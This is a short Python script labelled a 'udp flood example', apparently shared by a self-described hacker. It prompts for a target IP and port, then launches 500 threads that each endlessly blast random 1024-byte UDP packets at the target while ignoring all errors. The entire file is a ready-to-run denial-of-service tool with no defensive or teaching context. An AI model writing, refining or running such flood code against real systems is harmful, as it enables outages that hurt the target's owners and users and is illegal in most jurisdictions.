#udp flood example by SiberianHacker (Shwepsik)
import socket
from threading import Thread
import random

ip = input("IP > ")
port = input("PORT > ")
port = int(port)

def send(ip, port):
    while True:
        try:
            data = random._urandom(1024)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #юдипи сокет
            sock.connect((ip, port))
            sock.sendall(data)
        except:
            pass

for thrs in range(500):
    Thread(target=send, args=(ip, port)).start()
